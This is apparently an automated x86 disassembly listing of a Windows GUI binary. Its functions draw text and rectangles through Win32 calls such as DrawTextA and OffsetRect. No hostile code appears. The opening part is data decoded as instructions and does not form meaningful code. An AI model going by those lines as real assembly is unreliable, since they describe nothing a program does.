adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
add al 0xb9
inc ecx
add [ eax ] ch
into
inc ebx
add [ edx + eax ] dl
add bh bh
adc al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop ss
add [ ebx ] cl
dec ebp
outsd
popad
insb
push edx
jae r-xdata
add bh bh
inc esp
inc esp
jb r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
push [ esp + esi * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
add [ eax ] al
jmp [ eax + ebx + 0x19400044 ]
add [ eax + 0x3c00412e ] dl
add [ eax ] al
inc ah
sbb [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sub al 0xd6
inc ebx
add [ ecx ] ah
add bh bh
movsb [ edi ] [ esi ]
sbb [ eax + eax + 0x40 ] al
sbb [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
dec eax
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
insb
je r-xdata
popad
jo r-xdata
sldt [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
aad 0x43
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
in al 0x18
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add bh bh
or [ 0x10044 ] ah
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or [ eax + 0x6f ] edx
jo r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
adc [ eax ] eax
pop es
inc esp
popa
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
into
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
jo r-xdata
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax ] al
or [ edi + 0x6f ] dl
jb r-xdata
inc esp
add [ eax ] bl
inc esi
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
shl [ ebx + 0x10043 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
add [ eax ] al
and [ ebx ] 0x0
push edi
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
jmp [ eax + 0x68004426 ]
add [ eax ] 0x0
add [ eax + 0x4f090026 ] al
inc esp
jb r-xdata
jo r-xdata
dec ebx
jns r-xdata
sub al 0x1a
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
sbb al [ ecx ]
rol [ ecx ] 0x0
jo r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0022 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
sbb al [ ecx ]
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
cmp [ esi + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070021 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al [ eax ]
push cs
dec edi
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
or cl [ edi + 0x6e ]
fadd [ ebx ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0024 ] al
outsb
inc esp
jb r-xdata
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax + 0x4f090025 ] al
outsb
js r-xdata
loopne r-xdata
jo r-xdata
fadd [ ebx ]
mov eax 0xe00043d8
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or [ edi + 0x6e ] ecx
sbb al [ ecx ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
push es
dec edi
outsb
add [ eax + 0x4f070027 ] al
add [ eax ] al
dec edi
jbe r-xdata
fiadd [ ebx ]
sbb [ ecx ] al
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ecx ] cl
dec edi
inc ebp
js r-xdata
xlat
dec edi
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
jns r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : ecx ] cl
dec edi
jo r-xdata
adc al 0x2
push ebp
jo r-xdata
arpl [ ebx - 0x24 ] bp
fld [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
inc esp
outsd
ja r-xdata
add [ eax ] al
hlt
popad
dec ebp
outsd
jbe r-xdata
add [ eax ] al
jmp eax
insb
fadd [ ebx ]
call 0xffffffffe9428c64
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002b ] al
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
dec ebp
outsd
jne r-xdata
fadd [ ebx ]
fadd [ ecx ]
add bh bh
fadd [ ecx ]
add bh bh
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x24 ] bp
fiadd [ ebx ]
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0900
add [ eax ] al
add [ eax ] al
inc esp
jb r-xdata
fld [ ebx ]
call 0xffffffffe9428b45
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0023 ] al
outsb
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002e ] al
fild [ ebx ]
add [ ecx ] al
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] cl
dec edi
outsb
push ebx
je r-xdata
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
jb r-xdata
or al bl
inc ebx
add al bl
add [ eax ] al
push ebx
je r-xdata
dec edi
outsb
nop
xlat
inc ebx
add al ah
sahf
inc ecx
add [ eax - 0x3ffbfcb ] ah
push 0x32dc0044
inc eax
add al bh
xor al [ eax ]
aam 0x4b
jb r-xdata
inc ecx
add [ eax ] dl
mov bh 0x43
add [ eax - 0x33ffbb6d ] dh
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
sbb [ edx - 0x5abfffbf ] ah
inc esp
jb r-xdata
inc esp
add [ eax + ebx * 4 + 0x60c40044 ] bl
inc esp
add [ ecx + ecx * 2 + 0x46580041 ] dh
inc esp
inc esp
outsd
js r-xdata
test [ di + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ esi + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 4 + 0x43 ] dl
add [ esi - 0x72 ] ch
inc ebx
add [ edx + eax ] dl
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0xb2ac0044
inc ebx
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add [ eax ] al
mov ecx 0x5f0c0043
inc esp
add [ eax - 0x47 ] bl
inc ebx
add [ edx + 0x62c00044 ] bh
inc esp
add [ eax + 0x61 ] bh
inc esp
add [ eax ] ah
popad
inc esp
add [ eax + 0x6800448d ] bl
imul eax [ eax + eax - 0x74 ] 0xffffff9f
inc esp
add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 - 0x488fffbc ] al
inc ebx
add [ eax + edi * 4 + 0x43 ] dh
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0x84ff
add [ esp + 0x24240044 ] ch
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
sub_438caa
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec edi
outsb
push ebx
je r-xdata
nop
xlat
inc ebx
add al ah
add [ eax ] al
jmp eax
add [ eax ] ah
sbb al [ eax + eax + 0x78 ]
dec ebp
jb r-xdata
inc ecx
add [ eax ] dl
mov bh 0x43
add [ eax - 0x33ffbb6d ] dh
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esi + ecx * 4 + 0x44 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax ] ch
dec eax
inc esp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ esp ] ah
sbb [ edx - 0x5abfffbf ] ah
inc esp
jb r-xdata
js r-xdata
test [ di + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ esi + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 4 + 0x43 ] dl
add [ esi - 0x72 ] ch
inc ebx
add [ edx + eax ] dl
add [ eax ] al
hlt
inc esp
add [ eax ] bh
daa
inc esp
add ah ah
and eax 0xb2ac0044
inc ebx
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax - 0x10 ] es
dec ebp
inc esp
add [ esp + edx * 2 + 0x62240044 ] al
inc esp
add [ eax ] al
mov ecx 0x5f0c0043
inc esp
add [ eax - 0x47 ] bl
inc ebx
add [ edx + 0x62c00044 ] bh
inc esp
add [ eax + 0x61 ] bh
inc esp
add [ eax ] ah
popad
inc esp
add [ eax + 0x6800448d ] bl
imul eax [ eax + eax - 0x74 ] 0xffffff9f
inc esp
add [ edx + ecx * 4 ] dl
inc esp
add [ ecx * 4 - 0x488fffbc ] al
inc ebx
add [ eax + edi * 4 + 0x43 ] dh
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0x84ff
add [ esp + 0x24240044 ] ch
inc esp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ eax ] ah
mov [ 0xffffffffa2180041 ] al
inc ecx
add [ eax - 0x5b ] al
sub_439c14
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44aa4c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_441d0c
mov edx 0x69
mov eax esi
call sub_441d30
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_439c70
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444df0
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_41e130
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41e08c
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_439cdc
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_43a07e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_41e130
call sub_436540
call sub_436620
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_41e08c
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_442550
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_412f04
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412f04
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_442550
mov eax [ ebp - 0x54 ]
call sub_404354
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_442550
mov eax [ ebp - 0x58 ]
call sub_404554
push eax
mov eax edi
call sub_41e234
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_412f04
mov eax ebx
mov si 0xffc8
call sub_403540
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_41d9c8
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_41d9c8
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41dddc
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_41d9c8
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_41e234
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a085
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_4040b8
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_4040b8
lea eax [ ebp - 0x60 ]
call sub_404774
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_4040b8
retn
mov eax ebx
mov si 0xffc8
call sub_403540
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41dddc
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_442550
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_442550
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_41e070
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_412f04
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_412f04
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_442550
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_4048c0
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_41e234
push eax
call sub_436540
lea ecx [ ebp - 0x4c ]
pop edx
call sub_436820
jmp r-xdata
call sub_436540
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_436884
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_41e234
push eax
call sub_436540
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43672c
push 0x0
mov eax edi
call sub_41e234
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_442550
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_44487c
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_442550
mov eax [ ebp - 0x80 ]
call sub_404354
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_442550
mov eax [ ebp - 0x84 ]
call sub_404554
push eax
mov eax edi
call sub_41e234
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_41d9c8
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_442550
mov eax [ ebp - 0x88 ]
call sub_404354
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_442550
mov eax [ ebp - 0x8c ]
call sub_404554
push eax
mov eax edi
call sub_41e234
push eax
call DrawTextA
sub_43a08f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a10a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_442550
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45a280
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_448208
mov eax ebx
mov si 0xffb8
call sub_403540
test al al
je r-xdata
mov eax ebx
call sub_4492e4
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a111
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_43a15c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_449fcc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_441d0c
mov edx 0x11
mov eax esi
call sub_441d30
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_436540
call sub_436620
test al al
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_43a208
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a35e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44487c
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_41e130
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40435c
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404354
push eax
mov eax [ ebp - 0x4 ]
call sub_404554
push eax
mov eax [ ebx + 0x160 ]
call sub_41e234
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41d1d4
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404354
push eax
mov eax [ ebp - 0x4 ]
call sub_404554
push eax
mov eax [ ebx + 0x160 ]
call sub_41e234
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41d1d4
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_404354
push eax
mov eax [ ebp - 0x4 ]
call sub_404554
push eax
mov eax [ ebx + 0x160 ]
call sub_41e234
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a365
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_43a36f
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_43a598
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41dae4
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41d9c8
xor edx edx
mov eax [ esi + 0x14 ]
call sub_41dae4
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_41dda0
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403540
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403540
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_43a490
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_41e2b4
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403540
xor edx edx
mov eax [ edi + 0x160 ]
call sub_41e2b4
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403540
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_43f2dc
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_43a5d4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43a598
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43a634
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403540
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43a65c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_441a20
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_43a6c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a74d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a754
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_442550
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45a280
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403540
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_43a7a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_444ab0
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
